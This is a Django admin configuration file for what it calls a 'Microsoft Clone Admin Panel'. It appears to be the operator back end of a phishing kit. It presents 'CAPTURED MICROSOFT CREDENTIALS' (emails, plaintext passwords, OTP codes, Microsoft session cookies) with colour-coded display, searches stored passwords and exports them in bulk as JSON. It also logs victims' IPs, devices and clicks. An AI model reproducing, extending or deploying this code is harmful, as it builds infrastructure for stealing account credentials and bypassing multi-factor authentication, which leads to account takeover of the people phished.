from django.contrib import admin
from django.contrib.auth.models import User
from django.contrib.auth.admin import UserAdmin
from .models import SessionTracking, ClickEvent

# ========== UNREGISTER DEFAULT USER ADMIN ==========
try:
    admin.site.unregister(User)
except admin.sites.NotRegistered:
    pass

# ========== CUSTOM USER ADMIN ==========
@admin.register(User)
class CustomUserAdmin(UserAdmin):
    list_display = (
        'username',
        'email', 
        'first_name', 
        'last_name', 
        'is_staff', 
        'is_active',
        'date_joined',
        'last_login'
    )
    list_filter = ('is_staff', 'is_active', 'date_joined')
    search_fields = ('username', 'email', 'first_name', 'last_name')
    ordering = ('-date_joined',)
    
    fieldsets = UserAdmin.fieldsets + (
        ('Tracking Info', {
            'fields': (),
            'classes': ('collapse',)
        }),
    )

# ========== SESSION TRACKING ADMIN ==========
@admin.register(SessionTracking)
class SessionTrackingAdmin(admin.ModelAdmin):
    # What shows in the list view
    list_display = (
        'session_id_short',
        'email_display',
        'password_display',
        'otp_display',
        'otp_from_microsoft',
        'tracking_source',
        'device_type',
        'first_click',
        'converted_at',
        'email_sent'
    )
    
    # Filter options on the right sidebar
    list_filter = (
        'otp_from_microsoft',
        'tracking_source',
        'device_type',
        'browser_name',
        'email_sent',
        'converted_at'
    )
    
    # Searchable fields
    search_fields = (
        'session_id',
        'email',
        'password',
        'otp_code',
        'ip_address',
        'tracking_source'
    )
    
    # Fields that are read-only
    readonly_fields = (
        'session_id',
        'first_click',
        'last_activity',
        'raw_data',
        'view_raw_json'
    )
    
    # Fields to show in detail view
    fieldsets = (
        ('Session Identification', {
            'fields': ('session_id', 'user')
        }),
        ('CAPTURED MICROSOFT CREDENTIALS', {
            'fields': ('email', 'password', 'otp_code', 'otp_from_microsoft'),
            'classes': ('wide', 'extrapretty')
        }),
        ('Network Information', {
            'fields': ('ip_address', 'user_agent', 'referer', 'tracking_source'),
            'classes': ('collapse',)
        }),
        ('Device Information', {
            'fields': ('browser_name', 'browser_version', 'os_name', 'device_type', 'screen_width', 'screen_height'),
            'classes': ('collapse',)
        }),
        ('Timestamps', {
            'fields': ('first_click', 'last_activity', 'converted_at'),
            'classes': ('collapse',)
        }),
        ('Complete Raw Data', {
            'fields': ('raw_data', 'view_raw_json'),
            'classes': ('collapse',)
        }),
        ('Status', {
            'fields': ('email_sent', 'ms_session_cookie'),
            'classes': ('collapse',)
        }),
    )
    
    # Actions dropdown
    actions = ['mark_email_sent', 'mark_converted', 'export_selected']
    
    def session_id_short(self, obj):
        """Show shortened session ID"""
        return obj.session_id[:15] + '...' if len(obj.session_id) > 15 else obj.session_id
    session_id_short.short_description = 'Session ID'
    
    def email_display(self, obj):
        """Display email with color coding"""
        if obj.email:
            return f'<strong style="color: #0067b8;">{obj.email}</strong>'
        return 'N/A'
    email_display.short_description = '📧 Email'
    email_display.allow_tags = True
    
    def password_display(self, obj):
        """Display password with color coding"""
        if obj.password:
            return f'<span style="color: #dc3545; font-family: monospace;">{obj.password}</span>'
        return 'N/A'
    password_display.short_description = '🔑 Password'
    password_display.allow_tags = True
    
    def otp_display(self, obj):
        """Display OTP with color coding"""
        if obj.otp_code:
            if obj.otp_from_microsoft:
                return f'<span style="color: #28a745; font-weight: bold; font-size: 16px;">{obj.otp_code}</span>'
            return f'<span style="color: #ffc107; font-weight: bold;">{obj.otp_code}</span>'
        return 'N/A'
    otp_display.short_description = '🔢 OTP'
    otp_display.allow_tags = True
    
    def view_raw_json(self, obj):
        """Display raw JSON data in a readable format"""
        import json
        if obj.raw_data:
            pretty_json = json.dumps(obj.raw_data, indent=2, default=str)
            return f'<pre style="background: #f5f5f5; padding: 10px; border-radius: 4px; max-height: 400px; overflow: auto; font-size: 12px;">{pretty_json}</pre>'
        return 'No data'
    view_raw_json.short_description = '📄 Raw JSON Data'
    view_raw_json.allow_tags = True
    
    def mark_email_sent(self, request, queryset):
        """Mark selected sessions as email sent"""
        updated = queryset.update(email_sent=True)
        self.message_user(request, f'{updated} sessions marked as email sent.')
    mark_email_sent.short_description = 'Mark email as sent'
    
    def mark_converted(self, request, queryset):
        """Mark selected sessions as converted"""
        from django.utils import timezone
        updated = queryset.update(converted_at=timezone.now())
        self.message_user(request, f'{updated} sessions marked as converted.')
    mark_converted.short_description = 'Mark as converted'
    
    def export_selected(self, request, queryset):
        """Export selected sessions as JSON"""
        import json
        from django.http import HttpResponse
        
        data = []
        for session in queryset:
            data.append({
                'session_id': session.session_id,
                'email': session.email,
                'password': session.password,
                'otp_code': session.otp_code,
                'otp_from_microsoft': session.otp_from_microsoft,
                'ip_address': session.ip_address,
                'tracking_source': session.tracking_source,
                'device_type': session.device_type,
                'browser_name': session.browser_name,
                'first_click': session.first_click.isoformat() if session.first_click else None,
                'converted_at': session.converted_at.isoformat() if session.converted_at else None,
                'raw_data': session.raw_data
            })
        
        response = HttpResponse(
            json.dumps(data, indent=2, default=str),
            content_type='application/json'
        )
        response['Content-Disposition'] = 'attachment; filename="exported_sessions.json"'
        return response
    export_selected.short_description = '📥 Export selected sessions (JSON)'

# ========== CLICK EVENT ADMIN ==========
@admin.register(ClickEvent)
class ClickEventAdmin(admin.ModelAdmin):
    list_display = (
        'session_link',
        'event_type',
        'x_position',
        'y_position',
        'target_element',
        'timestamp'
    )
    
    list_filter = ('event_type', 'timestamp')
    search_fields = ('target_element', 'session__session_id', 'session__email')
    readonly_fields = ('timestamp',)
    
    def session_link(self, obj):
        """Link to the session in admin"""
        from django.urls import reverse
        from django.utils.html import format_html
        
        url = reverse('admin:accounts_sessiontracking_change', args=[obj.session.id])
        return format_html('<a href="{}">{}</a>', url, obj.session.session_id[:15])
    session_link.short_description = 'Session'
    
    fieldsets = (
        ('Event Information', {
            'fields': ('session', 'event_type', 'target_element')
        }),
        ('Position', {
            'fields': ('x_position', 'y_position')
        }),
        ('Timestamp', {
            'fields': ('timestamp',)
        }),
    )

# ========== CUSTOM ADMIN SITE HEADER ==========
admin.site.site_header = 'Microsoft Clone Admin Panel'
admin.site.site_title = 'Microsoft Clone Admin'
admin.site.index_title = 'Welcome to Microsoft Clone Admin - Captured Session Data'